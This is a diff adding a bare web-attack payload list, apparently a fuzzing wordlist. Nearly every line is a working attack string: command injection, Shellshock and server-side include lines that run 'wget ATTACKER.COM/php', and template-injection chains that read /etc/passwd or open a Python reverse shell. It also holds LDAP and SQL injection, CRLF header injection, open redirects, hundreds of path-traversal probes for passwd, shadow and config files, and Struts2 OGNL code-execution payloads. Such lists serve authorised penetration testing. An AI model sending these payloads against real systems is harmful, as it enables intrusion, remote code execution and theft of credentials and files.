@@ -1,0 +1,610 @@
+"ls
+'ls
+";ls
+';ls
+"|ls
+'|ls
+" && ls
+' && ls
+'--
+"--
+../../../
+"../../../
+'../../../
+*
+*)(&
+*))%00
+*()|%26'
+*()|&'
+*(|(mail=*))
+*(|(objectclass=*))
+*)(uid=*))(|(uid=*
+*/*
+*|
+/
+//
+//*
+@*
+|
+admin*
+admin*)((|userpassword=*)
+admin*)((|userPassword=*)
+x' or name()='username' or 'x'='y
+@ATTACKER.COM
+"wget ATTACKER.COM
+'wget ATTACKER.COM
+&lt;!--#exec%20cmd=&quot;/usr/bin/wget%20ATTACKER.COM&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/wget%20ATTACKER.COM&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+/index.html|id|
+;id;
+;id
+;netstat -a;
+;system('wget%20ATTACKER.COM)
+;id;
+|id
+|/usr/bin/id
+|id|
+|/usr/bin/id|
+||/usr/bin/id|
+|id;
+||/usr/bin/id;
+;id|
+;|/usr/bin/id|
+\n/bin/ls -al\n
+\n/usr/bin/id\n
+\nid\n
+\n/usr/bin/id;
+\nid;
+\n/usr/bin/id|
+\nid|
+;/usr/bin/id\n
+;id\n
+|usr/bin/id\n
+|nid\n
+`id`
+`/usr/bin/id`
+a);id
+a;id
+a);id;
+a;id;
+a);id|
+a;id|
+a)|id
+a|id
+a)|id;
+a|id
+|/bin/ls -al
+a);/usr/bin/id
+a;/usr/bin/id
+a);/usr/bin/id;
+a;/usr/bin/id;
+a);/usr/bin/id|
+a;/usr/bin/id|
+a)|/usr/bin/id
+a|/usr/bin/id
+a)|/usr/bin/id;
+a|/usr/bin/id
+;system('wget%20ATTACKER.COM')
+;system('id')
+;system('/usr/bin/id')
+%0Awget%20ATTACKER.COM
+%0A/usr/bin/id
+%0Aid
+%0A/usr/bin/id%0A
+%0Aid%0A
+& ping -i 30 ATTACKER.COM &
+& ping -n 30 ATTACKER.COM &
+%0a ping -i 30 ATTACKER.COM %0a
+`ping ATTACKER.COM`
+| id
+& id
+; id
+%0a id %0a
+`wget ATTACKER.COM/php`
+$;/usr/bin/id
+() { :;}; /bin/bash -c "wget ATTACKER.COM/php"
+wget ATTACKER.COM/php
+$(`wget ATTACKER.COM/php`)
+/usr/bin/wget ATTACKER.COM/php
+%0Acat%20/etc/passwd
+{{ get_user_file("/etc/passwd") }}
+<!--#exec cmd="/usr/bin/wget ATTACKER.COM/php"-->
+<!--#exec cmd="/usr/bin/wget ATTACKER.COM/php"-->
+<!--#exec cmd="/usr/bin/wget ATTACKER.COM/php;-->
+system('wget ATTACKER.COM/PHP');
+<?php system("wget ATTACKER.COM/PHP");?>
+1\';var d=new Date();do{var cd=new Date();}while(cd-d<1);var>
+'a';sleep(1) and 'a';sleep(10000)
+a;sleep(1) and a;sleep(10000)
+sleep(1) and sleep(10000)
+$where:"sleep(1)" and $where:"sleep(10000)"
+%5b%5d=_security and %5b%5d=_all_docs
+%5b%24eq%5d=1 and %5b%24ne%5d=1
+';sleep(1);var xyz='0 and ';sleep(10000);var xyz='0
+;import os;os.system('wget ATTACKER.COM/python')
+%0aimport os%0aos.system('wget ATTACKER.COM/python')%0aexit()
+%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a
+%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00
+{{555-123}}[[555-123]]
+{{555-123}}
+{{555-'123'}}
+<%= 555-123 %>
+${555-123}
+${{555-123}}
+@(555-123)
+#{555-123}
+#{555-123}
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+{{config.items()}}
+{{ [].class.base.subclasses() }}
+{{''.class.mro()[1].subclasses()}}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
+{{'a'.toUpperCase()}} 
+{{ request }}
+{{self}}
+<%= File.open('/etc/passwd').read %>
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
+${"freemarker.template.utility.Execute"?new()("id")}
+{{app.request.query.filter(0,0,1024,{'options':'system'})}}
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
+{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
+{$smarty.version}
+{php}echo `id`;{/php}
+{{['id']|filter('system')}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+{{['cat$IFS/etc/passwd']|filter('system')}}
+{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
+{{request|attr(["_"*2,"class","_"*2]|join)}}
+{{request|attr(["__","class","__"]|join)}}
+{{request|attr("__class__")}}
+{{request.__class__}}
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+${T(java.lang.System).getenv()}
+${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
+<!--#exec cmd="wget ATTACKER.COM/python" --><br/>
+<!--#exec cmd="mail Florian Roth @4nc4p <mailto:Florian Roth @4nc4p> < wget ATTACKER.COM/python" --><br/>
+<script>alert("XSS")</script>
+<ITMIGHTWORKBUTLOOKHERE
+"ITMIGHTWORKBUTLOOKHERE
+'ITMIGHTWORKBUTLOOKHERE
+%45ITMIGHTWORKBUTLOOKHERE
+%0AHeader-Test:BLATRUC
+%0A%20Header-Test:BLATRUC
+%20%0AHeader-Test:BLATRUC
+%23%OAHeader-Test:BLATRUC
+%E5%98%8A%E5%98%8DHeader-Test:BLATRUC
+%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC
+%3F%0AHeader-Test:BLATRUC
+crlf%0AHeader-Test:BLATRUC
+crlf%0A%20Header-Test:BLATRUC
+crlf%20%0AHeader-Test:BLATRUC
+crlf%23%OAHeader-Test:BLATRUC
+crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC
+crlf%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC
+crlf%3F%0AHeader-Test:BLATRUC
+%0DHeader-Test:BLATRUC
+%0D%20Header-Test:BLATRUC
+%20%0DHeader-Test:BLATRUC
+%23%0DHeader-Test:BLATRUC
+%23%0AHeader-Test:BLATRUC
+%E5%98%8A%E5%98%8DHeader-Test:BLATRUC
+%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC
+%3F%0DHeader-Test:BLATRUC
+crlf%0DHeader-Test:BLATRUC
+crlf%0D%20Header-Test:BLATRUC
+crlf%20%0DHeader-Test:BLATRUC
+crlf%23%0DHeader-Test:BLATRUC
+crlf%23%0AHeader-Test:BLATRUC
+crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC
+crlf%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC
+crlf%3F%0DHeader-Test:BLATRUC
+%0D%0AHeader-Test:BLATRUC
+%0D%0A%20Header-Test:BLATRUC
+%20%0D%0AHeader-Test:BLATRUC
+%23%0D%0AHeader-Test:BLATRUC
+\r\nHeader-Test:BLATRUC
+ \r\n Header-Test:BLATRUC
+\r\n Header-Test:BLATRUC
+%5cr%5cnHeader-Test:BLATRUC
+%E5%98%8A%E5%98%8DHeader-Test:BLATRUC
+%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC
+%3F%0D%0AHeader-Test:BLATRUC
+crlf%0D%0AHeader-Test:BLATRUC
+crlf%0D%0A%20Header-Test:BLATRUC
+crlf%20%0D%0AHeader-Test:BLATRUC
+crlf%23%0D%0AHeader-Test:BLATRUC
+crlf\r\nHeader-Test:BLATRUC
+crlf%5cr%5cnHeader-Test:BLATRUC
+crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC
+crlf%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC
+crlf%3F%0D%0AHeader-Test:BLATRUC
+%0D%0A%09Header-Test:BLATRUC
+crlf%0D%0A%09Header-Test:BLATRUC
+%250AHeader-Test:BLATRUC
+%25250AHeader-Test:BLATRUC
+%%0A0AHeader-Test:BLATRUC
+%25%30AHeader-Test:BLATRUC
+%25%30%61Header-Test:BLATRUC
+%u000AHeader-Test:BLATRUC
+//www.google.com/%2F%2E%2E%0D%0AHeader-Test:BLATRUC
+/www.google.com/%2E%2E%2F%0D%0AHeader-Test:BLATRUC
+/google.com/%2F..%0D%0AHeader-Test:BLATRUC
+{{ 555-123 }}
+https://ATTACKER.COM
+http://ATTACKER.COM
+https://ATTACKER.COM/#VICTIM.COM
+http://ATTACKER.COM/#VICTIM.COM
+@ATTACKER.COM
+VICTIM.COM@ATTACKER.COM
+/.../.../.../.../.../
+\…..\\\…..\\\…..\\\
+%00../../../../../../etc/passwd
+%00/etc/passwd%00
+%00../../../../../../etc/shadow
+%00/etc/shadow%00
+%0a/bin/cat%20/etc/passwd
+%0a/bin/cat%20/etc/shadow
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%  25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%    25%5c..%25%5c..%255cboot.ini
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini
+/../../../../../../../../%2A
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow
+..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed
+..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd
+..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow
+=3D “/..” . “%2f..
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini
+admin/access_log
+/admin/install.php
+../../../administrator/inbox
+/apache2/logs/access_log
+/apache2/logs/access.log
+/apache2/logs/error_log
+/apache2/logs/error.log
+/apache/logs/access_log
+/apache/logs/access.log
+../../../../../apache/logs/access.log
+../../../../apache/logs/access.log
+../../../apache/logs/access.log
+../../apache/logs/access.log
+../apache/logs/access.log
+/apache/logs/error_log
+/apache/logs/error.log
+../../../../../apache/logs/error.log
+../../../../apache/logs/error.log
+../../../apache/logs/error.log
+../../apache/logs/error.log
+../apache/logs/error.log
+/apache\php\php.ini
+\\&apos;/bin/cat%20/etc/passwd\\&apos;
+\\&apos;/bin/cat%20/etc/shadow\\&apos;
+/.bash_history
+/.bash_profile
+/.bashrc
+/../../../../../../../../bin/id|
+/bin/php.ini
+/boot/grub/grub.conf
+/./././././././././././boot.ini
+/../../../../../../../../../../../boot.ini
+/..\../..\../..\../..\../..\../..\../boot.ini
+/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini
+..//..//..//..//..//boot.ini
+../../../../../../../../../../../../boot.ini
+../../boot.ini
+..\../..\../..\../..\../boot.ini
+..\../..\../boot.ini
+..\..\..\..\..\..\..\..\..\..\boot.ini
+\..\..\..\..\..\..\..\..\..\..\boot.ini
+/../../../../../../../../../../../boot.ini%00
+../../../../../../../../../../../../boot.ini%00
+..\..\..\..\..\..\..\..\..\..\boot.ini%00
+/../../../../../../../../../../../boot.ini%00.html
+/../../../../../../../../../../../boot.ini%00.jpg
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow
+c:\apache\logs\access.log
+c:\apache\logs\error.log
+c:\AppServ\MySQL
+C:/boot.ini
+C:\boot.ini
+/C:/inetpub/ftproot/
+C:/inetpub/wwwroot/global.asa
+C:\inetpub\wwwroot\global.asa
+c:\inetpub\wwwroot\index.asp
+/config.asp
+../config.asp
+config.asp
+../config.inc.php
+config.inc.php
+../config.js
+config.js
+_config.php
+../_config.php
+../config.php
+config.php
+../_config.php%00
+../../../../../../../../conf/server.xml
+/core/config.php
+/C:\Program Files\
+c:\Program Files\Apache Group\Apache\logs\access.log
+c:\Program Files\Apache Group\Apache\logs\error.log
+/.cshrc
+c:\System32\Inetsrv\metabase.xml
+c:WINDOWS/system32/
+d:\AppServ\MySQL
+database.asp
+database.js
+database.php
+data.php
+dbase.php a
+db.php
+../../../../../../../dev
+/D:\Program Files\
+d:\System32\Inetsrv\metabase.xml
+/etc/apache2/apache2.conf
+/etc/apache2/conf/httpd.conf
+/etc/apache2/httpd.conf
+/etc/apache2/sites-available/default
+/etc/apache2/vhosts.d/default_vhost.include
+/etc/apache/apache.conf
+/etc/apache/conf/httpd.conf
+/etc/apache/httpd.conf
+/etc/apt/sources.list
+/etc/chrootUsers
+/etc/crontab
+/etc/defaultdomain
+/etc/default/passwd
+/etc/defaultrouter
+/etc/fstab
+/etc/ftpchroot
+/etc/ftphosts
+/etc/group
+/etc/hostname.bge
+/etc/hostname.ce0
+/etc/hostname.ce1
+/etc/hostname.ce2
+/etc/hostname.ce3
+/etc/hostname.dcelx0
+/etc/hostname.dcelx1
+/etc/hostname.dcelx2
+/etc/hostname.dcelx3
+/etc/hostname.dmfe0
+/etc/hostname.dmfe1
+/etc/hostname.dmfe2
+/etc/hostname.dmfe3
+/etc/hostname.dnet0
+/etc/hostname.dnet1
+/etc/hostname.dnet2
+/etc/hostname.dnet3
+/etc/hostname.ecn0
+/etc/hostname.ecn1
+/etc/hostname.ecn2
+/etc/hostname.ecn3
+/etc/hostname.elx0
+/etc/hostname.elx1
+/etc/hostname.elx2
+/etc/hostname.elx3
+/etc/hostname.elxl0
+/etc/hostname.elxl1
+/etc/hostname.elxl2
+/etc/hostname.elxl3
+/etc/hostname.eri0
+/etc/hostname.eri1
+/etc/hostname.eri2
+/etc/hostname.eri3
+/etc/hostname.ge0
+/etc/hostname.ge1
+/etc/hostname.ge2
+/etc/hostname.ge3
+/etc/hostname.hme0
+/etc/hostname.hme1
+/etc/hostname.hme2
+/etc/hostname.hme3
+/etc/hostname.ieef0
+/etc/hostname.ieef1
+/etc/hostname.ieef2
+/etc/hostname.ieef3
+/etc/hostname.iprb0
+/etc/hostname.iprb1
+/etc/hostname.iprb2
+/etc/hostname.iprb3
+/etc/hostname.le0
+/etc/hostname.le1
+/etc/hostname.le2
+/etc/hostname.le3
+/etc/hostname.lo
+/etc/hostname.pcn0
+/etc/hostname.pcn1
+/etc/hostname.pcn2
+/etc/hostname.pcn3
+/etc/hostname.qfe0
+/etc/hostname.qfe1
+/etc/hostname.qfe2
+/etc/hostname.qfe3
+/etc/hostname.spwr0
+/etc/hostname.spwr1
+/etc/hostname.spwr2
+/etc/hostname.spwr3
+/etc/hosts
+../../../../../../../../../../../../etc/hosts
+../../../../../../../../../../../../etc/hosts%00
+/etc/hosts.allow
+/etc/hosts.deny
+/etc/hosts.equiv
+/etc/http/conf/httpd.conf
+/etc/httpd.conf
+/etc/httpd/conf.d/php.conf
+/etc/httpd/conf.d/squirrelmail.conf
+/etc/httpd/conf.d/ssl.conf
+/etc/httpd/conf/httpd.conf
+/etc/httpd/httpd.conf
+/etc/httpd/logs/acces_log
+/etc/httpd/logs/acces.log
+../../../../../../../etc/httpd/logs/acces_log
+../../../../../../../etc/httpd/logs/acces.log
+/etc/httpd/logs/access_log
+/etc/httpd/logs/access.log
+../../../../../etc/httpd/logs/access_log
+../../../../../etc/httpd/logs/access.log
+/etc/httpd/logs/error_log
+/etc/httpd/logs/error.log
+../../../../../../../etc/httpd/logs/error_log
+../../../../../../../etc/httpd/logs/error.log
+../../../../../etc/httpd/logs/error_log
+../../../../../etc/httpd/logs/error.log
+/etc/httpd/php.ini
+/etc/http/httpd.conf
+/etc/inetd.conf
+/etc/init.d/apache
+/etc/init.d/apache2
+/etc/issue
+/etc/logrotate.d/ftp
+/etc/logrotate.d/httpd
+/etc/logrotate.d/proftpd
+/etc/logrotate.d/vsftpd.log
+/etc/mail/access
+/etc/mailman/mm_cfg.py
+/etc/make.conf
+/etc/master.passwd
+/etc/motd
+/etc/my.cnf
+/etc/mysql/my.cnf
+/etc/netconfig
+/etc/nsswitch.conf
+/etc/opt/ipf/ipf.conf
+/etc/opt/ipf/ipnat.conf
+/./././././././././././etc/passwd
+/../../../../../../../../../../etc/passwd
+/../../../../../../../../../../etc/passwd^^
+/..\../..\../..\../..\../..\../..\../etc/passwd
+/etc/passwd
+../../../../../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../etc/passwd
+../../../../../../../../../../etc/passwd
+../../../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../etc/passwd
+../../../../etc/passwd
+../../../etc/passwd
+../../etc/passwd
+../etc/passwd
+..\..\..\..\..\..\..\..\..\..\etc\passwd
+.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd
+\..\..\..\..\..\..\..\..\..\..\etc\passwd
+etc/passwd
+/etc/passwd%00
+../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../etc/passwd%00
+../../../../../../../../../etc/passwd%00
+../../../../../../../../etc/passwd%00
+../../../../../../../etc/passwd%00
+../../../../../../etc/passwd%00
+../../../../../etc/passwd%00
+../../../../etc/passwd%00
+../../../etc/passwd%00
+../../etc/passwd%00
+../etc/passwd%00
+AAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+PRE-${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.print(new%20java.lang.Integer(829%2b9))%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}-POST&INJPARAM=HOOK_VAL
+${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40java.lang.Thread%40sleep(10000)%2c1%3f%23xx%3a%23request.toString}
+${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=new%20java.io.File(%23parameters.INJPARAM[0]),%23pppp=new%20java.io.FileInputStream(%23wwww),%23qqqq=new%20java.lang.Long(%23wwww.length()),%23tttt=new%20byte[%23qqqq.intValue()],%23llll=%23pppp.read(%23tttt),%23pppp.close(),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(new+java.lang.String(%23tttt))%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=%2fetc%2fpasswd
+${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=new%20java.io.File(%23parameters.INJPARAM[0]),%23pppp=%23wwww.listFiles(),%23qqqq=@java.util.Arrays@toString(%23pppp),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23qqqq)%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=..
+${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=@java.lang.Runtime@getRuntime(),%23ssss=new%20java.lang.String[3],%23ssss[0]="%2fbin%2fsh",%23ssss[1]="%2dc",%23ssss[2]=%23parameters.INJPARAM[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=touch%20/tmp/InjectedFile.txt
+${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=@java.lang.Runtime@getRuntime(),%23ssss=new%20java.lang.String[3],%23ssss[0]="cmd",%23ssss[1]="%2fC",%23ssss[2]=%23parameters.INJPARAM[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=touch%20/tmp/InjectedFile.txt
+${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path88888887:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}
+${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}
+%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8
+%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f HTTP/1.1
+%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('hxvjptv200','hxvjptv200')}.multipart/form-data
+%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('ijyjaxr','ijyjaxr')}.multipart/form-data
+%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('rwjwnbv','rwjwnbv')}.multipart/form-data 
+%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vaxoruc','vaxoruc')}.multipart/form-data
